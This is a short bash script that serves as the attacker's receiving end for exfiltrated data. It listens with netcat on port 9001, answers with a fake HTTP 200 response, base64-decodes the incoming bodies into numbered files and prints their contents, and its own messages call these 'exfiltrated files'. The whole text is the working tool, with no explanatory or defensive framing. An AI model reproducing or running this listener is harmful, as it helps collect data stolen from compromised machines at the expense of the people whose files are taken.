#!/bin/bash
basename="file_"
count=0
receive=1
echo "Wiping old exfiltrated files"
rm $basename* 2&>/dev/null
while [ $receive -eq 1  ]
do
    echo "Receiving file n°: "$count" ..."
    file=$basename$count
    echo -e 'HTTP/1.1 200 OK\r\n' | nc -lnp 9001 | tail -n +7 | base64 -Do > $file
    echo "Received file n° "$count" with content: "`cat $file`
    echo "Do you want to [c]ontinue or [s]top:"
    read answer
    if [ $answer != 'c' ]
    then
        receive=0
    fi
    echo ""
    count=$(($count+1))
done

exit 0
